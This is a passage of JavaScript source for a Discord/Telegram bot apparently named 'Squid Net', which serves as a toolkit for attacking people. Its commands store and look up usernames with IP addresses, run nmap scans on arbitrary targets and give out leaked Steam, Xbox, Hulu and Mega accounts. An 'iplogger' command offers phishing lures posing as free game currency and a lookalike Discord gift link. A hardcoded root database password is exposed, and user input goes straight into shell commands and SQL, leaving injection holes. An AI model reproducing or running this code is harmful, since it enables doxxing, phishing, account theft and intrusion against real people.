          }
          if (p == null) {
            var p = "";
          }
          if (q == null) {
            var q = "";
          }
          if (r == null) {
            var r = "";
          }
          if (s == null) {
            var s = "";
          }
          if (t == null) {
            var t = "";
          }
          if (u == null) {
            var u = "";
          }
          var embed = new Discord.MessageEmbed()
            .setTitle(`${title}`)
            .setAuthor("TR4P$QU1D")
            .setColor(0x089FEF)
            .setDescription(`${a} ${b} ${c} ${d} ${e} ${f} ${g} ${h} ${i} ${j} ${k} ${l} ${m} ${n} ${o} ${p} ${q} ${r} ${s} ${t} ${u}`)
            .setTimestamp()
          client.channels.cache.get(`${channel}`).send(embed)
          break;
        }
        commandNotFound()
        break;
      }
      case 'apiping': {
        if (illegal === "true") {
          break;
        }
        var string = `${Math.round(client.ws.ping)}MS\n`
        var embed = new Discord.MessageEmbed()
          .setTitle("Ping Test!")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'update': {
        if (row.admin == "0") {
          break;
        }
        if (illegal === "true") {
          break;
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        const output = execSync(`git pull https://github.com/TR4PSQU1D/Bort.git master`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var string = `Updated from github.\nReboot me.`
        var embed = new Discord.MessageEmbed()
          .setTitle("Updated!")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'claim': {
        if (illegal === "true") {
          break;
        }
        var response = args.join(' ');
        var plan1 = 0;
        var execSync = require('child_process').execSync;
        var key = "--------------------------------------"
        var [key] = args.toString().split(",");
        if (key == null) {
          break;
        }
        fs.readFile("keys.txt", function(err, data) {
          if (err) throw err;
          if (data.includes(`${key}`)) {
            var string = "Key claimed!"
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            const output = execSync(`sed -i '/${key}/d' keys.txt`, {
              encoding: 'utf-8'
            }); // the default is 'buffer'
            var con = mysql.createConnection({
              host: "localhost",
              user: "root",
              password: "fuckingpeopleover",
              timeout: 6000000,
              database: "bot"
            });
            var planidenti = key.substring(0, 1);
            if (planidenti === "1") {
              var discrim = "1"
            } else if (planidenti === "2") {
              var discrim = "2"
            } else if (planidenti === "3") {
              var discrim = "3"
            } else if (planidenti === "4") {
              var discrim = "4"
            } else if (planidenti === "5") {
              var discrim = "5"
            } else if (planidenti === "6") {
              var discrim = "6"
            } else if (planidenti === "7") {
              var discrim = "7"
            } else if (planidenti === "8") {
              var discrim = "8"
            } else if (planidenti === "9") {
              var discrim = "9"
            } else if (planidenti === "69") {
              var discrim = "69"
            } else {
              message.channel.send("Invalid Key")
            }
            if (planidenti == "1") {
              var ex = parseInt(messageTime) + parseInt(ExpT);
            }
            if (planidenti == "2") {
              var ex = parseInt(messageTime) + parseInt(ExpW);
            }
            if (planidenti == "3") {
              var ex = parseInt(messageTime) + parseInt(ExpM);
            }
            if (planidenti == "4") {
              var ex = parseInt(messageTime) + parseInt(ExpM);
            }
            if (planidenti == "5") {
              var ex = parseInt(messageTime) + parseInt(ExpM);
            }
            if (planidenti == "6") {
              var ex = parseInt(messageTime) + parseInt(ExpM);
            }
            if (planidenti == "7") {
              var ex = parseInt(messageTime) + parseInt(ExpM);
            }
            if (planidenti == "8") {
              var ex = parseInt(messageTime) + parseInt(ExpM);
            }
            if (planidenti == "9") {
              var ex = parseInt(messageTime) + parseInt(ExpM);
            }
            if (planidenti == "69") {
              var ex = parseInt(messageTime) + parseInt("999999999999999999999999999999999999999999999999999999999999999999999");
            }
            sql = `UPDATE user SET expiry = '${ex}' WHERE id = '${user}'`;
            con.query(sql)
            sql = `UPDATE user SET plan = '${planidenti}' WHERE id = '${user}'`;
            con.query(sql)
            sql = `UPDATE user SET plan = '${planidenti}' WHERE id = '${user}'`;
            con.query(sql)
          } else {
            var string = "Invalid Key"
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
          }
        });
        break;
      }
      case 'generatekeys': {
        if (parseInt(row.admin) == 1) {
          var execSync = require('child_process').execSync;
          var [plan, amount] = args.toString().toLowerCase().split(",");
          planKeys(plan, amount)
        } else {
          var string = `You cant use this!`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
        }
        break;
        break;
      }
      /*case 'hitlist': {
        if (illegal === "true") {
          break;
        }
        if (runningBot == "Discord") {
          var args = message.content.slice(prefix.length).trim().split(/ +/g); // Remove prefix from command
          var args2 = args.shift();
        } else if (runningBot == "Telegram") {
          var args = msg.text.slice(prefix.length).trim().split(/ +/g);
          var args2 = args.shift();
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        const output = execSync(`cat hitlist.txt`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var embed = new Discord.MessageEmbed()
          .setTitle("Currently active Hitlist:")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${output}`)
          .setTimestamp()
        message.channel.send({
          embed
        })
        break;
      }
      case 'hitlistadd': {
        if (!row.admin == "1") {
          message.channel.send("Message a staff member")
          break;
        }
        if (runningBot == "Discord") {
          var args = message.content.slice(prefix.length).trim().split(/ +/g); // Remove prefix from command
          var args2 = args.shift();
        } else if (runningBot == "Telegram") {
          var args = msg.text.slice(prefix.length).trim().split(/ +/g);
          var args2 = args.shift();
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        const output = execSync(`echo ${response} >> hitlist.txt`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var embed = new Discord.MessageEmbed()
          .setTitle("Added to Hitlist:")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${response}`)
          .setTimestamp()
        message.channel.send({
          embed
        })
        break;
      }
      case 'hitlistremove': {
        if (!row.admin == "1") {
          message.channel.send("Message a staff member")
          break;
        }
        if (runningBot == "Discord") {
          var args = message.content.slice(prefix.length).trim().split(/ +/g); // Remove prefix from command
          var args2 = args.shift();
        } else if (runningBot == "Telegram") {
          var args = msg.text.slice(prefix.length).trim().split(/ +/g);
          var args2 = args.shift();
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        const output = execSync(`sed -i '/${response}/d' hitlist.txt`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var embed = new Discord.MessageEmbed()
          .setTitle('removed')
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${response}`)
          .setTimestamp()
        message.channel.send({
          embed
        })
        break;
      }*/
      case 'steamcode': {
        if (illegal === "true") {
          break;
        }
        var response = args.join(' ');;
        var execSync = require('child_process').execSync;
        const output = execSync(`sed -n 1p accounts/steamcodes.txt`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        const output1 = execSync(`sed -i 1d accounts/steamcodes.txt`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var string = `Please check your dms.`
        var embed = new Discord.MessageEmbed()
          .setTitle("Account sent!")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        var string = `all codes might not work is a 50/50 chance: **${output}**`
        if (runningBot == "Discord") {
          message.author.send(`${string}`)
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'xboxcode': {
        if (illegal === "true") {
          break;
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        const output = execSync(`sed -n 1p accounts/xbox.txt`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        const output1 = execSync(`sed -i 1d accounts/xbox.txt`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var string = `Please check your dms.`
        var embed = new Discord.MessageEmbed()
          .setTitle("Account sent!")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        var string = `all codes might not work is a 50/50 chance: **${output}**`
        if (runningBot == "Discord") {
          message.author.send(`${string}`)
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'mega': {
        if (illegal === "true") {
          break;
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        const output = execSync(`sed -n 1p accounts/mega.txt`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        const output1 = execSync(`sed -i 1d accounts/mega.txt`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var string = `Please check your dms.`
        var embed = new Discord.MessageEmbed()
          .setTitle("Account sent!")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        var string = `all codes might not work is a 50/50 chance: **${output}**`
        if (runningBot == "Discord") {
          message.author.send(`${string}`)
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'hulu': {
        if (illegal === "true") {
          break;
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        const output = execSync(`sed -n 1p accounts/hulu.txt`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        const output1 = execSync(`sed -i 1d accounts/hulu.txt`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var string = `Please check your dms.`
        var embed = new Discord.MessageEmbed()
          .setTitle("Account sent!")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        var string = `all codes might not work is a 50/50 chance: **${output}**`
        if (runningBot == "Discord") {
          message.author.send(`${string}`)
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'dbshow': {
        if (illegal === "true") {
          break;
        }
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `Discord Only`);
          return;
        }
        let user1 = []
        var response = args.join(' ');
        var method = "err";
        var execSync = require('child_process').execSync;
        var con = mysql.createConnection({
          host: "localhost",
          user: "root",
          password: "fuckingpeopleover",
          timeout: 6000000,
          database: "userDB"
        });

        function countWords(str) {
          str = str.replace(/(^\s*)|(\s*$)/gi, "");
          str = str.replace(/[ ]{2,}/gi, " ");
          str = str.replace(/\n /, "\n");
          return str.split(' ').length;
        }
        var length = countWords(response);
        var minLength = 1
        if (length < minLength) {
          var string = `-------------------------------------------\n/dbshow PAGE_NUMBER\n-------------------------------------------`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        var page = 1;
        var [page] = args.toString().split(",");
        let getCount = page * 101;
        let i = 0;
        let limit = getCount - 1;
        con.query(`SELECT * from users LIMIT ${getCount}`, (err, rows) => {
          if (err) throw err;
          rows.forEach((row) => {
            i++;
            user1.push(`${row.user}`);
            if (i > limit) {
              var users1 = user1.slice(1).slice(-98)
              var string = `${users1}`
              var embed = new Discord.MessageEmbed()
                .setTitle(`Users Page ${page}:`)
                .setAuthor("Squid Net")
                .setColor(0x00AE86)
                .setDescription(`${users1}`)
                .setTimestamp()
              if (runningBot == "Discord") {
                message.channel.send({
                  embed
                })
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `${string}`);
              }
            }
          });
        });
        break;
      }
      case 'adddbuser': {
        if (parseInt(row.admin) == 1) {
          var execSync = require('child_process').execSync;
          var output = execSync(`echo "${args[0]}" >> /root/bot/adduser.txt`, {
            encoding: 'utf-8'
          }); // the default is 'buffer'
          var string = `Added ${args[0]}`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        } else {
          var string = 'THE FUCK YOU TRYING TO DO CUNT?!'
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        break;
      }
      case 'dbget': {
        if (illegal === "true") {
          break;
        }
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `Discord Only`);
          return;
        }
	if (parseInt(message.author.id) == 755683755137564744) {
	  return;
	}
        var response = args.join(' ');
        console.log(response)
        var method = "err";
        var execSync = require('child_process').execSync;
        var con = mysql.createConnection({
          host: "localhost",
          user: "root",
          password: "fuckingpeopleover",
          timeout: 6000000,
          database: "userDB"
        });
        con.query(`SELECT * from users WHERE user like "%${response}%"`, (err, rows) => {
          if (err) throw err;
	 if (parseInt(rows.length) > 1) {
	 	return
	}
          rows.forEach((row) => {
            var string = `Username: ${row.user}\nIP Address: ${row.ip}`
            var embed = new Discord.MessageEmbed()
              .setTitle("Result:")
              .setAuthor("Squid Net")
              .setColor(0x089FEF)
              .setDescription(`${string}`)
              .setTimestamp()
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
          });
        });
        break;
      }
      case 'dbsearch': {
        if (illegal === "true") {
          break;
        }
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `Discord Only`);
          return;
        }
        let users = []
        var response1 = args.join(' ');
        var method = "err";
        var execSync = require('child_process').execSync;
        var con = mysql.createConnection({
          host: "localhost",
          user: "root",
          password: "fuckingpeopleover",
          timeout: 6000000,
          database: "userDB"
        });
        var response = response1.replace(/[^a-zA-Z ]/g, "")
        con.query(`SELECT * from users WHERE user like "%${response}%"`, (err, rows) => {
          if (err) throw err;
          rows.forEach((row) => {
            users.push(`${row.user}`);
          });
          var string = `${users}`
          var embed = new Discord.MessageEmbed()
            .setTitle("Result:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
        });
        break;
      }
      case 'dbcount': {
        if (illegal === "true") {
          break;
        }
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `Discord Only`);
          return;
        }
        let users = []
        var response = args.join(' ');
        var method = "err";
        var execSync = require('child_process').execSync;
        var con = mysql.createConnection({
          host: "localhost",
          user: "root",
          password: "fuckingpeopleover",
          timeout: 6000000,
          database: "userDB"
        });
        let count = 0;
        con.query(`select * from users`, (err, rows) => {
          if (err) throw err;
          rows.forEach((row) => {
            count++;
          });
          var string = `${count} Entries `
          var embed = new Discord.MessageEmbed()
            .setTitle("Result:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
        });
        break;
      }
      case 'dbgive': {
        if (illegal === "true") {
          break;
        }
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `Discord Only`);
          return;
        }
        if (parseInt(row.addToDB) == 0) {
          var string = "No access."
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        var response = args.join(' ');
        var method = "err";
        var ip = "";
        var user1 = "";
        var [user1, ip] = response.split(":");
        var execSync = require('child_process').execSync;
        var con = mysql.createConnection({
          host: "localhost",
          user: "root",
          password: "fuckingpeopleover",
          timeout: 6000000,
          database: "userDB"
        });

        function countWords(str) {
          str = str.replace(/(^\s*)|(\s*$)/gi, "");
          str = str.replace(/[ ]{2,}/gi, " ");
          str = str.replace(/\n /, "\n");
          return str.split(' ').length;
        }
        var length = countWords(response);
        var minLength = 1
        if (length < minLength) {
          var string = `\n-------------------------------------------\n/dbadd user:ip THIS EXACT SYNTAX!\n-------------------------------------------`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        sql = `REPLACE INTO users (user, ip) VALUES ("${user1}", "${ip}")`;
        con.query(sql)
        var string = `Username: ${user1}\nIP Address: ${ip}`
        var embed = new Discord.MessageEmbed()
          .setTitle("Added:")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'dbsuggest': {
        if (illegal === "true") {
          break;
        }
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `Discord Only`);
          return;
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;

        function countWords(str) {
          str = str.replace(/(^\s*)|(\s*$)/gi, "");
          str = str.replace(/[ ]{2,}/gi, " ");
          str = str.replace(/\n /, "\n");
          return str.split(' ').length;
        }
        var length = countWords(response);
        var minLength = 1
        if (length < minLength) {
          message.channel.send(`\n-------------------------------------------\n/dbsuggest user:ip THIS EXACT SYNTAX!\n-------------------------------------------`)
          break;
        }
        const output = execSync(`echo "${response}" >> suggestedips.txt`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var string = `Please wait for this to be checked.`
        var embed = new Discord.MessageEmbed()
          .setTitle("Suggested!")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'getsuggested': {
        if (illegal === "true") {
          break;
        }
        if (parseInt(row.admin) == 1) {
          message.channel.send({
            files: ['./suggestedips.txt']
          });
          var string = "Note: Adding an IP from here does not remove it from this file."
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        } else {
          var string = 'THE FUCK YOU TRYING TO DO CUNT?!'
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        break;
      }
      case 'nmapsv': {
        if (!row.admin == "1") {
          if (illegal === "true") {
            break;
          }
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        var exec = require('child_process').exec

        function countWords(str) {
          str = str.replace(/(^\s*)|(\s*$)/gi, "");
          str = str.replace(/[ ]{2,}/gi, " ");
          str = str.replace(/\n /, "\n");
          return str.split(' ').length;
        }
        var length = countWords(response);
        var minLength = 1
        if (length < minLength) {
          var string = `-------------------------------------------\n/nmapsv IP_ADDRESS {PORT}//port is optional\n-------------------------------------------`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        var ip = "err";
        var port = "err";
        var [ip, port] = args.toString().split(",");
        if (port == null) {
          var output = 'screen -d -m nmap -Pn -O -p- -sV ' + ip + ' -o /root/bot/users/' + user + 'nmap.txt';

          function execCB(error, stdout, stderr) {}
          var app = exec(output, execCB);
        } else {
          var output = 'screen -d -m nmap -Pn -O -p- -sV -p' + port + ' ' + ip + ' -o /root/bot/users/' + user + 'nmap.txt';

          function execCB(error, stdout, stderr) {}
          var app = exec(output, execCB);
        }
        var string = "Wait a bit and run /nmapresult (little buggy you may have to run /nmapresult twice)"
        if (runningBot == "Discord") {
          message.channel.send(`${string}`)
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'nmap': {
        if (!row.admin == "1") {
          if (illegal === "true") {
            break;
          }
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        var exec = require('child_process').exec

        function countWords(str) {
          str = str.replace(/(^\s*)|(\s*$)/gi, "");
          str = str.replace(/[ ]{2,}/gi, " ");
          str = str.replace(/\n /, "\n");
          return str.split(' ').length;
        }
        var length = countWords(response);
        var minLength = 1
        if (length < minLength) {
          message.channel.send(`-------------------------------------------\n/nmap IP_ADDRESS {PORT}//port is optional\n-------------------------------------------`)
          break;
        }
        var ip = "err";
        var port = "err";
        var [ip, port] = args.toString().split(",");
        if (port == null) {
          var output = 'screen -d -m nmap ' + ip + ' -o /root/bot/users/' + user + 'nmap.txt';

          function execCB(error, stdout, stderr) {}
          var app = exec(output, execCB);
        } else {
          var output = 'screen -d -m nmap -p' + port + ' ' + ip + ' -o /root/bot/users/' + user + 'nmap.txt';

          function execCB(error, stdout, stderr) {}
          var app = exec(output, execCB);
        }
        var string = "Wait a bit and run /nmapresult"
        if (runningBot == "Discord") {
          message.channel.send(`${string}`)
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'terminal': {
        if (!message.channel.name == undefined) {
          message.channel.bulkDelete(1);
        }
        if (!parseInt(row.admin) == 1) {
          var string = "Hahahahaah NO"
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
          if (illegal === "true") {
            break;
          }
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        var exec = require('child_process').exec

        function countWords(str) {
          str = str.replace(/(^\s*)|(\s*$)/gi, "");
          str = str.replace(/[ ]{2,}/gi, " ");
          str = str.replace(/\n /, "\n");
          return str.split(' ').length;
        }
        var length = countWords(response);
        var minLength = 1
        if (length < minLength) {
          var string = `-------------------------------------------\n/terminal pass\n-------------------------------------------`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (args.includes("AssumeAllEntinties93")) {
          var string = "Auth Succeded"
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          var execSync = require('child_process').execSync;
          var output = execSync(`echo "true" > terminal/${user}.txt; screen -dmS ${user}`, {
            encoding: 'utf-8'
          });
          var output = execSync(`screen -S ${user} -p 0 -X stuff 'exec $SHELL\n'`, {
            encoding: 'utf-8'
          });
          var output = execSync(`screen -S ${user} -p 0 -X stuff 'script -f /root/bot/terminal/${user}log.txt\n'`, {
            encoding: 'utf-8'
          });
          var string = "```Send Command /terminalquit to quit```"
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
        } else {
          var string = "Incorrect pass"
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        break;
      }
      case 'terminalquit': {
        if (!message.channel.name == undefined) {
          message.channel.bulkDelete(1);
        }
        if (!row.admin == "1") {
          message.channel.send("Hahahahaah NO")
          break;
          if (illegal === "true") {
            break;
          }
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        var exec = require('child_process').exec

        function countWords(str) {
          str = str.replace(/(^\s*)|(\s*$)/gi, "");
          str = str.replace(/[ ]{2,}/gi, " ");
          str = str.replace(/\n /, "\n");
          return str.split(' ').length;
        }
        var length = countWords(response);
        var minLength = 1
        var output = execSync(`screen -S ${user} -p 0 -X stuff 'exit\n'; screen -X -S ${user} kill`, {
          encoding: 'utf-8'
        });
        if (fs.existsSync(`terminal/${user}.txt`)) {
          fs.unlink(`terminal/${user}.txt`, function(err) {
            if (err && err.code == 'ENOENT') {
              console.info("File doesn't exist, won't remove it.");
            } else if (err) {
              console.error("Error occurred while trying to remove file");
            } else {}
          });
          if (fs.existsSync(`terminal/${user}log.txt`)) {
            fs.unlink(`terminal/${user}log.txt`, function(err) {
              if (err && err.code == 'ENOENT') {
                console.info("File doesn't exist, won't remove it.");
              } else if (err) {
                console.error("Error occurred while trying to remove file");
              } else {}
            });
          }
          var string = "```Quitting```"
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
        } else {
          var string = "Your not in terminal mode"
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        break;
      }
      case 'nmapresult': {
        if (!fs.existsSync(`users/${user}nmap.txt`)) {
          var string = "Result Not found"
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        var response = args.join(' ');
        if (illegal === "true") {
          break;
        }
        var exec = require('child_process').exec;
        var cmdToLaunch = `sed -i '/SF:/d' users/${user}nmap.txt; sleep 1; sed -i '/SF-/d' users/${user}nmap.txt; sleep 1; sed -i '/OS:/d' users/${user}nmap.txt; sleep 1`;

        function execCB(error, stdout, stderr) {}
        var app = exec(cmdToLaunch, execCB);
        var execSync = require('child_process').execSync;
        var response = args.join(' ');
        var contents = fs.readFileSync(`users/${user}nmap.txt`, 'utf-8');
        var string = contents
        if (runningBot == "Discord") {
          message.channel.send(`${string}`)
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'ping': {
        if (illegal === "true") {
          break;
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        if (args.includes('@', '<', '>')) {
          break;
        }
        var output = execSync(`ping -c 1 -W 2 ${response} | tee users/${user}ping.txt 2> /dev/null`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var contents = fs.readFileSync(`users/${user}ping.txt`, 'utf-8')
        if (contents.includes(", 0% packet loss")) {
          var out = "Online"
        } else {
          var out = "Offline"
        }
        var output = execSync(`cat users/${user}ping.txt | grep "time=" | sed 's/.*time=//'`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var output2 = execSync(`cat users/${user}ping.txt | grep ":" | sed 's/.*from //' | sed 's/.\:* //' | sed 's/\\icmp_seq=*//'  | sed 's/\\s.*$//'`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var string = `**${out}**\nHost: ${output2}\nTarget still online?\nMight be because they have ICMP turned off!`
        var embed = new Discord.MessageEmbed()
          .setTitle(`Pinging ${output}`)
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
          .setFooter(``);
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        var output = execSync(`echo "${out} ${output}" >> users/${user}cmd.log`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        fs.unlink(`users/${user}ping.txt`, function(err) {
          if (err && err.code == 'ENOENT') {
            console.info("File doesn't exist, won't remove it.");
          } else if (err) {
            console.error("Error occurred while trying to remove file");
          } else {}
        });
        break;
      }
      case 'tcpping': {
        if (illegal === "true") {
          break;
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        if (args.includes('@', '<', '>')) {
          break;
        }
        if (!response.includes(".")) {
          var string = `/tcpping IP PORT`
          var embed = new Discord.MessageEmbed()
            .setTitle("TCP Ping:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, ``);
          }
        }
        var output = execSync(`screen -d -m bash tcpping.sh ${response}; sleep 1`, {
          encoding: 'utf-8'
        });
        var contents = fs.readFileSync(`checking.txt`, 'utf-8')
        if (contents.includes("succeeded")) {
          var kraken = "Online"
        } else {
          var kraken = "Offline"
        }
        var string = `**${kraken}**`
        var embed = new Discord.MessageEmbed()
          .setTitle("TCP Ping:")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, ``);
        }
        break;
      }
      case 'iplogger': {
        if (illegal === "true") {
          break;
        }
        var response = args.join(' ');
        var string = "Releases: [Send To Target](http://releases.epizy.com/) | [Check Logged IPS Here <3](http://releases.epizy.com/ips.txt)\n Free vBucks: [Send To Target](http://freevbucks2020cheat.epizy.com/) | [Check Logged IPS Here <3](http://freevbucks2020cheat.epizy.com/ips.txt)\n Free Nitro: [Send To Target](http://freenitro.epizy.com/) | [Check Logged IPS Here <3](http://freenitro.epizy.com/ips.txt)\n Real Nitro: http://dlscord.gift/dj9jdsa | $5 Lifetime <3\n\n\nPing Loggers:\n/listen - Start receiving all ips pinging for the next 5 minutes.\n/stoplisten - Stop receiving ips."
        var embed = new Discord.MessageEmbed()
          .setTitle("Squid Net IP Logger <3:")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
          .setFooter(``);
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
